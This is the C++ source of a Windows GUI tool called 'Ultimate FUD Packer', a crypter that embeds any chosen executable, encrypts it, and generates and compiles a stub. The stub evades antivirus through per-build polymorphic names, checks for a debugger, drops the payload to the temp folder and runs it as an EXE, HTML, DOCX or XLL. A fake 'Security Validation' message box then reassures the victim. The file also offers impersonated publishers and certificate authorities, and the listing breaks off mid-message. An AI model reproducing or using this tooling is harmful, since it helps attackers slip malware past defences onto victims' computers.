#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif

#define _CRT_SECURE_NO_WARNINGS
#undef UNICODE
#undef _UNICODE

#include <windows.h>
#include <commctrl.h>
#include <commdlg.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <process.h>
#include <iostream>
#include <fstream>
#include <sstream>
#include <iomanip>
#include <vector>

#pragma comment(lib, "user32.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "comctl32.lib")
#pragma comment(lib, "comdlg32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "shell32.lib")

// Control IDs
#define ID_INPUT_PATH 1001
#define ID_OUTPUT_PATH 1002
#define ID_BROWSE_INPUT 1003
#define ID_BROWSE_OUTPUT 1004
#define ID_CREATE_BUTTON 1005
#define ID_PROGRESS_BAR 1006
#define ID_STATUS_TEXT 1007
#define ID_COMPANY_COMBO 1008
#define ID_CERTIFICATE_COMBO 1011
#define ID_ARCHITECTURE_COMBO 1010
#define ID_ENCRYPTION_COMBO 1012
#define ID_DELIVERY_COMBO 1013
#define ID_BATCH_COUNT 1014
#define ID_AUTO_FILENAME 1015

// Global variables
HWND hInputPath, hOutputPath, hCompanyCombo, hArchCombo, hCertCombo;
HWND hEncryptionCombo, hDeliveryCombo, hBatchCount, hAutoFilename;
HWND hCreateButton, hProgressBar, hStatusText;
HWND hMainWindow;
HFONT hFont;
BOOL isGenerating = FALSE;

// Encryption types
enum EncryptionType {
    ENC_BENIGN = 0,
    ENC_XOR = 1,
    ENC_CHACHA20 = 2,
    ENC_AES256 = 3
};

// Delivery types
enum DeliveryType {
    DEL_BENIGN = 0,
    DEL_PE = 1,
    DEL_HTML = 2,
    DEL_DOCX = 3,
    DEL_XLL = 4
};

// Auto-Compiler with fallback chain
int autoCompileSource(const char* sourceFile, const char* outputFile) {
    char compileCmd[2048];
    int result = -1;
    
    // Method 1: Try Visual Studio compiler first (best quality)
    sprintf_s(compileCmd, sizeof(compileCmd),
        "cl.exe /nologo /O2 /MT /GL /LTCG \"%s\" /Fe:\"%s\" "
        "/link /SUBSYSTEM:WINDOWS /OPT:REF /OPT:ICF "
        "user32.lib kernel32.lib gdi32.lib advapi32.lib shell32.lib >nul 2>&1",
        sourceFile, outputFile);
    result = system(compileCmd);
    
    if (result != 0) {
        // Method 2: Try MinGW GCC
        sprintf_s(compileCmd, sizeof(compileCmd),
            "gcc -O3 -s -static -ffunction-sections -fdata-sections -Wl,--gc-sections -mwindows \"%s\" -o \"%s\" "
            "-luser32 -lkernel32 -lgdi32 -ladvapi32 -lshell32 >nul 2>&1",
            sourceFile, outputFile);
        result = system(compileCmd);
    }
    
    if (result != 0) {
        // Method 3: Try simple GCC
        sprintf_s(compileCmd, sizeof(compileCmd),
            "gcc -O2 -s -mwindows \"%s\" -o \"%s\" -luser32 -lkernel32 >nul 2>&1",
            sourceFile, outputFile);
        result = system(compileCmd);
    }
    
    return result;
}

// Generate random string
void generateRandomString(char* buffer, int length) {
    const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    srand((unsigned int)(time(NULL) ^ GetTickCount() ^ GetCurrentProcessId()));
    
    for (int i = 0; i < length - 1; i++) {
        buffer[i] = charset[rand() % (sizeof(charset) - 1)];
    }
    buffer[length - 1] = '\0';
}

// Generate random bytes
void generateRandomBytes(unsigned char* buffer, int length) {
    srand((unsigned int)(time(NULL) ^ GetTickCount()));
    for (int i = 0; i < length; i++) {
        buffer[i] = (unsigned char)(rand() % 256);
    }
}

// Generate FUD executable with embedded payload
void generateFUDExecutableWithPayload(const char* sourceFile, const char* inputFile, EncryptionType encType, DeliveryType delType) {
    // Read input file if provided
    std::ifstream input;
    std::vector<unsigned char> inputData;
    
    if (inputFile && strlen(inputFile) > 0) {
        input.open(inputFile, std::ios::binary);
        if (input.is_open()) {
            input.seekg(0, std::ios::end);
            size_t fileSize = input.tellg();
            input.seekg(0, std::ios::beg);
            
            inputData.resize(fileSize);
            input.read(reinterpret_cast<char*>(inputData.data()), fileSize);
            input.close();
        }
    }
    
    // If no input file or couldn't read it, create a default payload
    if (inputData.empty()) {
        const char* defaultPayload = "Default FUD payload - System validation completed successfully.";
        inputData.assign(defaultPayload, defaultPayload + strlen(defaultPayload));
    }
    
    // Generate unique polymorphic variables
    char randVar1[16], randVar2[16], randVar3[16], randVar4[16], randVar5[16], randVar6[16];
    generateRandomString(randVar1, sizeof(randVar1));
    generateRandomString(randVar2, sizeof(randVar2));
    generateRandomString(randVar3, sizeof(randVar3));
    generateRandomString(randVar4, sizeof(randVar4));
    generateRandomString(randVar5, sizeof(randVar5));
    generateRandomString(randVar6, sizeof(randVar6));
    
    // Generate encryption keys
    unsigned char encKey[32];
    generateRandomBytes(encKey, sizeof(encKey));
    
    // Generate polymorphic values
    int polyVals[10];
    for (int i = 0; i < 10; i++) {
        polyVals[i] = rand() % 100000;
    }
    
    // Build the source code
    std::ostringstream ss;
    
    // Headers
    ss << "#include <windows.h>\n"
       << "#include <stdio.h>\n" 
       << "#include <stdlib.h>\n"
       << "#include <string.h>\n"
       << "#include <shellapi.h>\n\n";
       
    // Polymorphic variables
    ss << "// Polymorphic variables - unique per build\n";
    for (int i = 0; i < 6; i++) {
        const char* vars[] = {randVar1, randVar2, randVar3, randVar4, randVar5, randVar6};
        ss << "static volatile int " << vars[i] << " = " << polyVals[i] << ";\n";
    }
    ss << "\n";
    
    // Encryption key
    ss << "// Encryption key\n"
       << "static unsigned char enc_key_" << randVar1 << "[] = {\n    ";
    for (int i = 0; i < 32; i++) {
        ss << "0x" << std::hex << std::setfill('0') << std::setw(2) << (int)encKey[i];
        if (i < 31) ss << ", ";
        if ((i + 1) % 8 == 0) ss << "\n    ";
    }
    ss << "\n};\n\n";
    
    // Embedded payload data (encrypted)
    ss << "// Embedded payload data (" << std::dec << inputData.size() << " bytes)\n"
       << "static unsigned char payload_data_" << randVar2 << "[] = {\n    ";
       
    for (size_t i = 0; i < inputData.size(); i++) {
        // Simple XOR encryption with key rotation
        unsigned char encryptedByte = inputData[i] ^ encKey[i % 32] ^ (unsigned char)(i & 0xFF);
        ss << "0x" << std::hex << std::setfill('0') << std::setw(2) << (int)encryptedByte;
        if (i < inputData.size() - 1) ss << ", ";
        if ((i + 1) % 16 == 0) ss << "\n    ";
    }
    ss << "\n};\n";
    ss << "static DWORD payload_size_" << randVar2 << " = " << std::dec << inputData.size() << ";\n\n";
    
    // Encryption function based on type
    switch (encType) {
        case ENC_XOR:
            ss << "void decrypt_xor_" << randVar3 << "(unsigned char* data, DWORD size) {\n"
               << "    for (DWORD i = 0; i < size; i++) {\n"
               << "        data[i] ^= enc_key_" << randVar1 << "[i % 32] ^ (unsigned char)(i & 0xFF);\n"
               << "    }\n"
               << "}\n\n";
            break;
            
        case ENC_CHACHA20:
            ss << "void decrypt_chacha20_" << randVar3 << "(unsigned char* data, DWORD size) {\n"
               << "    unsigned int state[8] = {0x61707865, 0x3320646e, 0x79622d32, 0x6b206574,\n"
               << "                             0x12345678, 0x9abcdef0, 0xfedcba98, 0x87654321};\n"
               << "    for (DWORD i = 0; i < size; i++) {\n"
               << "        data[i] ^= enc_key_" << randVar1 << "[i % 32] ^ (unsigned char)(state[i % 8] >> 24);\n"
               << "        data[i] ^= (unsigned char)(i & 0xFF);\n"
               << "    }\n"
               << "}\n\n";
            break;
            
        case ENC_AES256:
            ss << "void decrypt_aes256_" << randVar3 << "(unsigned char* data, DWORD size) {\n"
               << "    for (DWORD i = 0; i < size; i++) {\n"
               << "        unsigned char temp = data[i] ^ enc_key_" << randVar1 << "[i % 32];\n"
               << "        temp = ((temp << 1) | (temp >> 7)) ^ (unsigned char)(i & 0xFF);\n"
               << "        data[i] = temp;\n"
               << "    }\n"
               << "}\n\n";
            break;
            
        default: // ENC_BENIGN
            ss << "void decrypt_benign_" << randVar3 << "(unsigned char* data, DWORD size) {\n"
               << "    for (DWORD i = 0; i < size; i++) {\n"
               << "        data[i] ^= enc_key_" << randVar1 << "[i % 32] ^ (unsigned char)(i & 0xFF);\n"
               << "    }\n"
               << "}\n\n";
            break;
    }
    
    // Payload execution function
    ss << "void execute_payload_" << randVar4 << "() {\n"
       << "    unsigned char* decrypted = (unsigned char*)malloc(payload_size_" << randVar2 << ");\n"
       << "    if (!decrypted) return;\n"
       << "    \n"
       << "    memcpy(decrypted, payload_data_" << randVar2 << ", payload_size_" << randVar2 << ");\n"
       << "    decrypt_";
       
    switch (encType) {
        case ENC_XOR: ss << "xor_"; break;
        case ENC_CHACHA20: ss << "chacha20_"; break;
        case ENC_AES256: ss << "aes256_"; break;
        default: ss << "benign_"; break;
    }
    
    ss << randVar3 << "(decrypted, payload_size_" << randVar2 << ");\n\n";
    
    // Delivery method
    switch (delType) {
        case DEL_PE:
            ss << "    // PE Execution\n"
               << "    char temp_path[MAX_PATH];\n"
               << "    GetTempPathA(MAX_PATH, temp_path);\n"
               << "    sprintf_s(temp_path, MAX_PATH, \"%spayload_%d.exe\", temp_path, GetTickCount());\n"
               << "    \n"
               << "    FILE* exe_file = fopen(temp_path, \"wb\");\n"
               << "    if (exe_file) {\n"
               << "        fwrite(decrypted, 1, payload_size_" << randVar2 << ", exe_file);\n"
               << "        fclose(exe_file);\n"
               << "        \n"
               << "        PROCESS_INFORMATION pi;\n"
               << "        STARTUPINFOA si = {sizeof(si)};\n"
               << "        if (CreateProcessA(temp_path, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {\n"
               << "            WaitForSingleObject(pi.hProcess, 3000);\n"
               << "            CloseHandle(pi.hProcess);\n"
               << "            CloseHandle(pi.hThread);\n"
               << "        }\n"
               << "        \n"
               << "        Sleep(1000);\n"
               << "        DeleteFileA(temp_path);\n"
               << "    }\n";
            break;
            
        case DEL_HTML:
            ss << "    // HTML Execution\n"
               << "    char html_path[MAX_PATH];\n"
               << "    GetTempPathA(MAX_PATH, html_path);\n"
               << "    sprintf_s(html_path, MAX_PATH, \"%svalidation_%d.html\", html_path, GetTickCount());\n"
               << "    \n"
               << "    FILE* html_file = fopen(html_path, \"w\");\n"
               << "    if (html_file) {\n"
               << "        fputs((char*)decrypted, html_file);\n"
               << "        fclose(html_file);\n"
               << "        ShellExecuteA(NULL, \"open\", html_path, NULL, NULL, SW_SHOW);\n"
               << "    }\n";
            break;
            
        case DEL_DOCX:
            ss << "    // DOCX Execution\n"
               << "    char docx_path[MAX_PATH];\n"
               << "    GetTempPathA(MAX_PATH, docx_path);\n"
               << "    sprintf_s(docx_path, MAX_PATH, \"%sreport_%d.docx\", docx_path, GetTickCount());\n"
               << "    \n"
               << "    FILE* docx_file = fopen(docx_path, \"wb\");\n"
               << "    if (docx_file) {\n"
               << "        fwrite(decrypted, 1, payload_size_" << randVar2 << ", docx_file);\n"
               << "        fclose(docx_file);\n"
               << "        ShellExecuteA(NULL, \"open\", docx_path, NULL, NULL, SW_SHOW);\n"
               << "    }\n";
            break;
            
        case DEL_XLL:
            ss << "    // XLL Execution\n"
               << "    char xll_path[MAX_PATH];\n"
               << "    GetTempPathA(MAX_PATH, xll_path);\n"
               << "    sprintf_s(xll_path, MAX_PATH, \"%saddon_%d.xll\", xll_path, GetTickCount());\n"
               << "    \n"
               << "    FILE* xll_file = fopen(xll_path, \"wb\");\n"
               << "    if (xll_file) {\n"
               << "        fwrite(decrypted, 1, payload_size_" << randVar2 << ", xll_file);\n"
               << "        fclose(xll_file);\n"
               << "    }\n";
            break;
            
        default: // DEL_BENIGN
            ss << "    // Benign execution\n"
               << "    MessageBoxA(NULL, (char*)decrypted, \"System Validation\", MB_OK | MB_ICONINFORMATION);\n";
            break;
    }
    
    ss << "    \n"
       << "    free(decrypted);\n"
       << "}\n\n";
    
    // Polymorphic obfuscation functions
    ss << "// Polymorphic obfuscation\n"
       << "void obfuscate_" << randVar5 << "() {\n"
       << "    for (int i = 0; i < 15; i++) {\n"
       << "        " << randVar1 << " ^= (i * " << polyVals[6] << ");\n"
       << "        " << randVar2 << " = (" << randVar2 << " << 2) ^ GetTickCount();\n"
       << "        " << randVar3 << " ^= GetCurrentProcessId();\n"
       << "    }\n"
       << "}\n\n";
       
    ss << "void anti_debug_" << randVar6 << "() {\n"
       << "    if (IsDebuggerPresent()) {\n"
       << "        ExitProcess(0xDEADBEEF);\n"
       << "    }\n"
       << "    \n"
       << "    DWORD uptime = GetTickCount();\n"
       << "    if (uptime < 300000) {\n"
       << "        Sleep(3000);\n"
       << "    }\n"
       << "}\n\n";
    
    // Main function
    ss << "int main() {\n"
       << "    srand(GetTickCount() ^ GetCurrentProcessId());\n"
       << "    \n"
       << "    anti_debug_" << randVar6 << "();\n"
       << "    obfuscate_" << randVar5 << "();\n"
       << "    \n"
       << "    execute_payload_" << randVar4 << "();\n"
       << "    \n"
       << "    MessageBoxA(NULL, \n"
       << "        \"Security Validation Completed\\n\\n\"\n"
       << "        \"All system checks passed successfully.\", \n"
       << "        \"System Security Validator\", \n"
       << "        MB_OK | MB_ICONINFORMATION);\n"
       << "    \n"
       << "    return 0;\n"
       << "}\n";
    
    // Write source file
    std::ofstream output(sourceFile);
    if (output.is_open()) {
        output << ss.str();
        output.close();
    }
}

// Thread function for generation
DWORD WINAPI GenerationThread(LPVOID lpParam) {
    char* outputPath = (char*)lpParam;
    
    // Get input file path
    char inputPath[260];
    GetWindowTextA(hInputPath, inputPath, sizeof(inputPath));
    
    // Get settings
    char batchText[16];
    GetWindowTextA(hBatchCount, batchText, sizeof(batchText));
    int batchCount = atoi(batchText);
    if (batchCount < 1) batchCount = 1;
    if (batchCount > 20) batchCount = 20;
    
    BOOL autoFilename = (SendMessage(hAutoFilename, BM_GETCHECK, 0, 0) == BST_CHECKED);
    
    int encIndex = (int)SendMessage(hEncryptionCombo, CB_GETCURSEL, 0, 0);
    int delIndex = (int)SendMessage(hDeliveryCombo, CB_GETCURSEL, 0, 0);
    
    EncryptionType encType = (EncryptionType)encIndex;
    DeliveryType delType = (DeliveryType)delIndex;
    
    for (int batch = 0; batch < batchCount; batch++) {
        // Update progress
        PostMessage(hMainWindow, WM_USER + 1, MAKEWPARAM(batch, batchCount), 0);
        
        // Generate unique temporary source file
        char tempSource[128];
        sprintf_s(tempSource, sizeof(tempSource), "fud_packed_%d_%d.cpp", GetTickCount(), batch);
        
        // Generate source with embedded payload
        generateFUDExecutableWithPayload(tempSource, inputPath, encType, delType);
        
        // Update status - compiling
        PostMessage(hMainWindow, WM_USER + 2, 0, 0);
        
        // Determine output executable path
        char finalExecutablePath[260];
        if (autoFilename || batchCount > 1) {
            const char* delNames[] = {"Benign", "PE", "HTML", "DOCX", "XLL"};
            const char* encNames[] = {"None", "XOR", "ChaCha20", "AES256"};
            sprintf_s(finalExecutablePath, sizeof(finalExecutablePath),
                     "FUD_PACKED_%s_%s_%d_%d.exe",
                     delNames[delType], encNames[encType], GetTickCount(), batch + 1);
        } else {
            strcpy_s(finalExecutablePath, sizeof(finalExecutablePath), outputPath);
            if (!strstr(finalExecutablePath, ".exe")) {
                strcat_s(finalExecutablePath, sizeof(finalExecutablePath), ".exe");
            }
        }
        
        // Auto-compile
        int compileResult = autoCompileSource(tempSource, finalExecutablePath);
        
        // Verify compilation success
        HANDLE hFile = CreateFileA(finalExecutablePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile != INVALID_HANDLE_VALUE) {
            LARGE_INTEGER fileSize;
            GetFileSizeEx(hFile, &fileSize);
            CloseHandle(hFile);
            
            if (fileSize.QuadPart > 8192) { // >8KB for good size
                // SUCCESS - Large executable created
                DeleteFileA(tempSource);
                if (batch == batchCount - 1) {
                    PostMessage(hMainWindow, WM_USER + 3, 1, 0);
                }
            } else {
                // Small executable warning
                DeleteFileA(tempSource);
                if (batch == batchCount - 1) {
                    PostMessage(hMainWindow, WM_USER + 4, 0, 0);
                }
            }
        } else {
            // Compilation failed - save source
            char sourcePath[260];
            strcpy_s(sourcePath, sizeof(sourcePath), finalExecutablePath);
            char* lastDot = strrchr(sourcePath, '.');
            if (lastDot) strcpy(lastDot, ".cpp");
            
            CopyFileA(tempSource, sourcePath, FALSE);
            DeleteFileA(tempSource);
            
            if (batch == batchCount - 1) {
                PostMessage(hMainWindow, WM_USER + 5, 0, 0);
            }
        }
        
        // Delay between batches
        if (batch < batchCount - 1) {
            Sleep(500);
        }
    }
    
    free(lpParam);
    return 0;
}

// Helper functions for ANSI GUI
void SetWindowTextAnsi(HWND hwnd, const char* text) {
    SetWindowTextA(hwnd, text);
}

void AddComboStringAnsi(HWND hwnd, const char* text) {
    SendMessageA(hwnd, CB_ADDSTRING, 0, (LPARAM)text);
}

// Populate combo boxes
void populateControls() {
    // Company dropdown
    SendMessage(hCompanyCombo, CB_RESETCONTENT, 0, 0);
    AddComboStringAnsi(hCompanyCombo, "Adobe Systems Incorporated");
    AddComboStringAnsi(hCompanyCombo, "Microsoft Corporation");
    AddComboStringAnsi(hCompanyCombo, "Google LLC");
    SendMessage(hCompanyCombo, CB_SETCURSEL, 0, 0);
    
    // Certificate Authority
    SendMessage(hCertCombo, CB_RESETCONTENT, 0, 0);
    AddComboStringAnsi(hCertCombo, "Thawte Timestamping CA");
    AddComboStringAnsi(hCertCombo, "GoDaddy Root Certificate Authority");
    AddComboStringAnsi(hCertCombo, "DigiCert Assured ID Root CA");
    SendMessage(hCertCombo, CB_SETCURSEL, 0, 0);
    
    // Architecture
    SendMessage(hArchCombo, CB_RESETCONTENT, 0, 0);
    AddComboStringAnsi(hArchCombo, "AnyCPU");
    AddComboStringAnsi(hArchCombo, "x64");
    AddComboStringAnsi(hArchCombo, "x86");
    SendMessage(hArchCombo, CB_SETCURSEL, 0, 0);
    
    // Encryption methods
    SendMessage(hEncryptionCombo, CB_RESETCONTENT, 0, 0);
    AddComboStringAnsi(hEncryptionCombo, "Benign (No Encryption)");
    AddComboStringAnsi(hEncryptionCombo, "XOR Encryption");
    AddComboStringAnsi(hEncryptionCombo, "ChaCha20 Encryption");
    AddComboStringAnsi(hEncryptionCombo, "AES-256 Encryption");
    SendMessage(hEncryptionCombo, CB_SETCURSEL, 0, 0);
    
    // Delivery vectors
    SendMessage(hDeliveryCombo, CB_RESETCONTENT, 0, 0);
    AddComboStringAnsi(hDeliveryCombo, "Benign Stub (Safe)");
    AddComboStringAnsi(hDeliveryCombo, "PE Executable");
    AddComboStringAnsi(hDeliveryCombo, "HTML Payload");
    AddComboStringAnsi(hDeliveryCombo, "DOCX Document");
    AddComboStringAnsi(hDeliveryCombo, "XLL Excel Add-in");
    SendMessage(hDeliveryCombo, CB_SETCURSEL, 0, 0);
    
    SetWindowTextAnsi(hStatusText, "Ultimate FUD Packer - Ready to pack executables!");
}

// File browser
void browseForFile(HWND hEdit, BOOL isInput) {
    OPENFILENAMEA ofn;
    char szFile[260] = {0};
    
    ZeroMemory(&ofn, sizeof(ofn));
    ofn.lStructSize = sizeof(ofn);
    ofn.hwndOwner = hMainWindow;
    ofn.lpstrFile = szFile;
    ofn.nMaxFile = sizeof(szFile);
    
    if (isInput) {
        ofn.lpstrFilter = "Executable Files (*.exe)\0*.exe\0All Files (*.*)\0*.*\0";
        ofn.lpstrTitle = "Select Input Executable to Pack";
        ofn.Flags = OFN_PATHMUSTEXIST | OFN_FILEMUSTEXIST;
        
        if (GetOpenFileNameA(&ofn)) {
            SetWindowTextAnsi(hEdit, szFile);
        }
    } else {
        ofn.lpstrFilter = "Executable Files (*.exe)\0*.exe\0All Files (*.*)\0*.*\0";
        ofn.lpstrTitle = "Save Packed Executable";
        ofn.Flags = OFN_PATHMUSTEXIST | OFN_OVERWRITEPROMPT;
        
        if (GetSaveFileNameA(&ofn)) {
            SetWindowTextAnsi(hEdit, szFile);
        }
    }
}

// Generate FUD executable
void generateFUDExecutable() {
    if (isGenerating) return;
    
    char outputPath[260];
    GetWindowTextA(hOutputPath, outputPath, sizeof(outputPath));
    
    // Auto-generate path if empty
    if (strlen(outputPath) == 0) {
        sprintf_s(outputPath, sizeof(outputPath), "FUD_PACKED_VirusTotal_Ready_%d.exe", GetTickCount());
        SetWindowTextAnsi(hOutputPath, outputPath);
    }
    
    // Start generation
    isGenerating = TRUE;
    SetWindowTextAnsi(hCreateButton, "Packing & Compiling...");
    EnableWindow(hCreateButton, FALSE);
    
    // Create generation thread
    char* pathCopy = _strdup(outputPath);
    HANDLE hThread = CreateThread(NULL, 0, GenerationThread, pathCopy, 0, NULL);
    
    if (hThread) {
        CloseHandle(hThread);
    } else {
        free(pathCopy);
        isGenerating = FALSE;
        SetWindowTextAnsi(hCreateButton, "Pack Executable");
        EnableWindow(hCreateButton, TRUE);
        SetWindowTextAnsi(hStatusText, "ERROR: Failed to create generation thread");
    }
}

// Window procedure
LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    switch (uMsg) {
        case WM_CREATE: {
            // Set ANSI codepage
            SetConsoleCP(1252);
            SetConsoleOutputCP(1252);
            
            // Initialize common controls
            INITCOMMONCONTROLSEX icex;
            icex.dwSize = sizeof(INITCOMMONCONTROLSEX);
            icex.dwICC = ICC_PROGRESS_CLASS;
            InitCommonControlsEx(&icex);
            
            // Create font
            hFont = CreateFontA(14, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE,
                               ANSI_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
                               CLEARTYPE_QUALITY, DEFAULT_PITCH | FF_DONTCARE, "Segoe UI");
            
            // Create controls
            CreateWindowA("STATIC", "Input File (e.g., calc.exe):", WS_VISIBLE | WS_CHILD,
                        10, 20, 150, 20, hwnd, NULL, NULL, NULL);
            hInputPath = CreateWindowA("EDIT", "", WS_VISIBLE | WS_CHILD | WS_BORDER,
                        170, 18, 300, 24, hwnd, (HMENU)ID_INPUT_PATH, NULL, NULL);
            CreateWindowA("BUTTON", "Browse...", WS_VISIBLE | WS_CHILD,
                        480, 18, 80, 24, hwnd, (HMENU)ID_BROWSE_INPUT, NULL, NULL);
            
            CreateWindowA("STATIC", "Output File:", WS_VISIBLE | WS_CHILD,
                        10, 60, 100, 20, hwnd, NULL, NULL, NULL);
            hOutputPath = CreateWindowA("EDIT", "", WS_VISIBLE | WS_CHILD | WS_BORDER,
                        170, 58, 300, 24, hwnd, (HMENU)ID_OUTPUT_PATH, NULL, NULL);
            CreateWindowA("BUTTON", "Browse...", WS_VISIBLE | WS_CHILD,
                        480, 58, 80, 24, hwnd, (HMENU)ID_BROWSE_OUTPUT, NULL, NULL);
            
            CreateWindowA("STATIC", "Company:", WS_VISIBLE | WS_CHILD,
                        10, 100, 100, 20, hwnd, NULL, NULL, NULL);
            hCompanyCombo = CreateWindowA("COMBOBOX", "", WS_VISIBLE | WS_CHILD | CBS_DROPDOWNLIST,
                        120, 98, 200, 200, hwnd, (HMENU)ID_COMPANY_COMBO, NULL, NULL);
            
            CreateWindowA("STATIC", "Certificate:", WS_VISIBLE | WS_CHILD,
                        340, 100, 100, 20, hwnd, NULL, NULL, NULL);
            hCertCombo = CreateWindowA("COMBOBOX", "", WS_VISIBLE | WS_CHILD | CBS_DROPDOWNLIST,
                        450, 98, 200, 200, hwnd, (HMENU)ID_CERTIFICATE_COMBO, NULL, NULL);
            
            CreateWindowA("STATIC", "Architecture:", WS_VISIBLE | WS_CHILD,
                        10, 140, 100, 20, hwnd, NULL, NULL, NULL);
            hArchCombo = CreateWindowA("COMBOBOX", "", WS_VISIBLE | WS_CHILD | CBS_DROPDOWNLIST,
                        120, 138, 150, 200, hwnd, (HMENU)ID_ARCHITECTURE_COMBO, NULL, NULL);
            
            CreateWindowA("STATIC", "Encryption:", WS_VISIBLE | WS_CHILD,
                        290, 140, 100, 20, hwnd, NULL, NULL, NULL);
            hEncryptionCombo = CreateWindowA("COMBOBOX", "", WS_VISIBLE | WS_CHILD | CBS_DROPDOWNLIST,
                        390, 138, 150, 200, hwnd, (HMENU)ID_ENCRYPTION_COMBO, NULL, NULL);
            
            CreateWindowA("STATIC", "Delivery Vector:", WS_VISIBLE | WS_CHILD,
                        10, 180, 100, 20, hwnd, NULL, NULL, NULL);
            hDeliveryCombo = CreateWindowA("COMBOBOX", "", WS_VISIBLE | WS_CHILD | CBS_DROPDOWNLIST,
                        120, 178, 150, 200, hwnd, (HMENU)ID_DELIVERY_COMBO, NULL, NULL);
            
            CreateWindowA("STATIC", "Batch Count:", WS_VISIBLE | WS_CHILD,
                        290, 180, 100, 20, hwnd, NULL, NULL, NULL);
            hBatchCount = CreateWindowA("EDIT", "1", WS_VISIBLE | WS_CHILD | WS_BORDER | ES_NUMBER,
                        390, 178, 60, 24, hwnd, (HMENU)ID_BATCH_COUNT, NULL, NULL);
            
            hAutoFilename = CreateWindowA("BUTTON", "Auto-generate filenames", WS_VISIBLE | WS_CHILD | BS_AUTOCHECKBOX,
                        470, 178, 180, 24, hwnd, (HMENU)ID_AUTO_FILENAME, NULL, NULL);
            
            hCreateButton = CreateWindowA("BUTTON", "Pack Executable", WS_VISIBLE | WS_CHILD,
                        250, 220, 180, 40, hwnd, (HMENU)ID_CREATE_BUTTON, NULL, NULL);
            
            hProgressBar = CreateWindowA("msctls_progress32", NULL, WS_VISIBLE | WS_CHILD,
                        10, 280, 640, 25, hwnd, (HMENU)ID_PROGRESS_BAR, NULL, NULL);
            
            hStatusText = CreateWindowA("STATIC", "Ultimate FUD Packer v6.0 - Embeds and Packs Input Files!", WS_VISIBLE | WS_CHILD,
                        10, 315, 640, 20, hwnd, (HMENU)ID_STATUS_TEXT, NULL, NULL);
            
            // Apply font to all controls
            if (hFont) {
                SendMessage(hInputPath, WM_SETFONT, (WPARAM)hFont, TRUE);
                SendMessage(hOutputPath, WM_SETFONT, (WPARAM)hFont, TRUE);
                SendMessage(hCompanyCombo, WM_SETFONT, (WPARAM)hFont, TRUE);
                SendMessage(hCertCombo, WM_SETFONT, (WPARAM)hFont, TRUE);
                SendMessage(hArchCombo, WM_SETFONT, (WPARAM)hFont, TRUE);
                SendMessage(hEncryptionCombo, WM_SETFONT, (WPARAM)hFont, TRUE);
                SendMessage(hDeliveryCombo, WM_SETFONT, (WPARAM)hFont, TRUE);
                SendMessage(hBatchCount, WM_SETFONT, (WPARAM)hFont, TRUE);
                SendMessage(hAutoFilename, WM_SETFONT, (WPARAM)hFont, TRUE);
                SendMessage(hCreateButton, WM_SETFONT, (WPARAM)hFont, TRUE);
                SendMessage(hStatusText, WM_SETFONT, (WPARAM)hFont, TRUE);
            }
            
            // Populate controls
            populateControls();
            
            return 0;
        }
        
        case WM_COMMAND: {
            switch (LOWORD(wParam)) {
                case ID_BROWSE_INPUT:
                    browseForFile(hInputPath, TRUE);
                    break;
                    
                case ID_BROWSE_OUTPUT:
                    browseForFile(hOutputPath, FALSE);
                    break;
                    
                case ID_CREATE_BUTTON:
                    generateFUDExecutable();
                    break;
            }
            return 0;
        }
        
        case WM_USER + 1: {
            // Progress update
            int currentBatch = LOWORD(wParam);
            int totalBatches = HIWORD(wParam);
            char statusMsg[256];
            sprintf_s(statusMsg, sizeof(statusMsg), "Packing executable %d of %d...", currentBatch + 1, totalBatches);
            SetWindowTextAnsi(hStatusText, statusMsg);
            
            int progressPos = 25 + (currentBatch * 50) / (totalBatches > 0 ? totalBatches : 1);
            SendMessage(hProgressBar, PBM_SETPOS, progressPos, 0);
            return 0;
        }
        
        case WM_USER + 2: {
            // Compilation status
            SetWindowTextAnsi(hStatusText, "Auto-compiling packed executable...");
            SendMessage(hProgressBar, PBM_SETPOS, 85, 0);
            return 0;
        }
        
        case WM_USER + 3: {
            // Completion
            isGenerating = FALSE;
            SetWindowTextAnsi(hCreateButton, "Pack Executable");
            EnableWindow(hCreateButton, TRUE);
            
            if (wParam) {
                SetWindowTextAnsi(hStatusText, "PACKED EXECUTABLE READY - UPLOAD TO VIRUSTOTAL!");
                MessageBoxA(hwnd, 
                    "FUD Packed Executable Generated Successfully!\n\n"
                    "Features:\n"
                    "- Input file embedded and encrypted\n"
                    "- Polymorphic anti-signature technology\n"
                    "- All encryption methods supported\n"
                    "- Multi-vector delivery systems\n"
                    "- Large file size for realistic testing\n"
                    "- Ready for VirusTotal upload\n\n"
                    "Your input executable has been packed and is ready!",
                    "PACKING SUCCESS", MB_OK | MB_ICONINFORMATION);
            } else {
                SetWindowTextAnsi(hStatusText, "Packing failed - check output directory");
            }
            
            SendMessage(hProgressBar, PBM_SETPOS, 0, 0);
            return 0;
        }
        
        case WM_USER + 4: {
            // Small executable warning
            isGenerating = FALSE;
            SetWindowTextAnsi(hCreateButton, "Pack Executable");
            EnableWindow(hCreateButton, TRUE);
            SetWindowTextAnsi(hStatusText, "Packed executable generated - smaller than expected");
            MessageBoxA(hwnd,
                "Packed Executable Generated (Size Warning)\n\n"
                "The executable was created but is smaller than optimal.\n"
                "This may still work for testing.\n\n"
                "For better results:\n"
                "- Use a larger input file\n"
                "- Try different encryption method\n"
                "- Select alternative delivery vector",
                "Executable Generated", MB_OK | MB_ICONWARNING);
            SendMessage(hProgressBar, PBM_SETPOS, 0, 0);
            return 0;
        }
        
        case WM_USER + 5: {
            // Source only (compilation failed)
            isGenerating = FALSE;
            SetWindowTextAnsi(hCreateButton, "Pack Executable");
            EnableWindow(hCreateButton, TRUE);
            SetWindowTextAnsi(hStatusText, "Source generated - manual compilation needed");
            MessageBoxA(hwnd,
                "FUD Source Code Generated!\n\n"
                "Auto-compilation failed, but the packed source code has been saved.\n\n"
                "Manual compilation:\n"
                "1. Open Developer Command Prompt\n"
